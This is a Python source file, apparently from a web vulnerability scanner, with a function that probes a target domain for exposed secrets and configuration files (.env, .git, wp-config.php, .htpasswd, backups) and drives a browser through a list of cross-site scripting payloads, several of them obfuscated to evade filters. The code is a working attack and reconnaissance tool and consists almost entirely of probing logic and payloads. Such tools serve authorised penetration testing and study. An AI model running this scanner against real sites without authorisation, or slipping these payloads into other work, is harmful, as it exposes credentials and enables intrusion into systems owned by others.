import requests
import platform
import time
import os
from colorama import Fore, Style
from selenium import webdriver
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.firefox.options import Options


fg = Fore.GREEN
fr = Fore.RED
fw = Fore.WHITE
fy = Fore.YELLOW
fo = Fore.LIGHTYELLOW_EX
flc = Fore.CYAN
bd = Style.BRIGHT
res = Style.RESET_ALL

def check_file_uploads_and_xss(domain, cookies, headers):
    paths = [
        '/upload/', '/file-upload/', '/uploads/', '/admin/upload/', '/admin/file-upload/',
        '/.git/', '/.env', '/config.php', '/wp-config.php', '/app/etc/env.php', '/app/etc/config.php',
        '/.htaccess', '/.htpasswd', '/config/database.yml', '/config/secrets.yml', '/composer.json',
        '/composer.lock', '/package.json', '/package-lock.json', '/.babelrc', '/.gitignore', '/.gitattributes',
        '/.npmrc', '/.yarnrc', '/phpinfo.php', '/info.php', '/test.php', '/debug.php', '/.DS_Store',
        '/backups/', '/backup/', '/backups.zip', '/backup.zip', '/private/', '/temp/', '/tmp/', '/logs/'
    ]

    xss_payloads = [
        "<script>alert('XSS');</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS');></iframe>",
        '\'"</Script><Html Onmouseover=(confirm)()//',
        '<imG/sRc=l oNerrOr=(prompt)() x>',
        '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
        '<deTails open oNToggle=confi\u0072m()>',
        '<img sRc=l oNerrOr=(confirm)() x>',
        '<svg/x=">"/onload=confirm()//',
        '<svg%0Aonload=%09((pro\u006dpt))()//',
        '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    ]

    os_type = platform.system()
    if os_type == "Windows":
        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver.exe')
    elif os_type in ["Linux", "Darwin"]:  # Für Linux und MacOS
        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver')
    else:
        raise Exception(f"Unsupported OS: {os_type}")

    service = FirefoxService(executable_path=geckodriver_path)
    options = Options()
    options.headless = False  

    driver = webdriver.Firefox(service=service, options=options)

    for path in paths:
        url = domain + path
        try:
            response = requests.get(url, headers=headers, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            if response.status_code == 200:
                print(f"{fg}[+] Sensitive file or directory found: {path}{fw}")
            else:
                print(f"{fy}[-] Path not found or not accessible: {path}{fw}")
        except requests.exceptions.RequestException as e:
            print(f"{fr}[-] Error checking path {path}: {e}{fw}")

    for payload in xss_payloads:
        try:
            full_url = f"{domain}/{payload}"
            driver.get(full_url)

            time.sleep(5)

            script_alert = False
            try:
                alert = driver.switch_to.alert
                alert.accept()
                script_alert = True
            except:
                pass

            if script_alert:
                print(f"{fg}[+] XSS vulnerability detected with payload (popup): {payload}{fw}")
            elif payload in driver.page_source:
                print(f"{fg}[+] XSS vulnerability detected with payload (reflected): {payload}{fw}")
            else:
                print(f"{fy}[-] No XSS vulnerability detected with payload: {payload}{fw}")

        except Exception as e:
            print(f"{fr}[-] Error checking XSS vulnerability with payload {payload}: {e}{fw}")

    driver.quit()
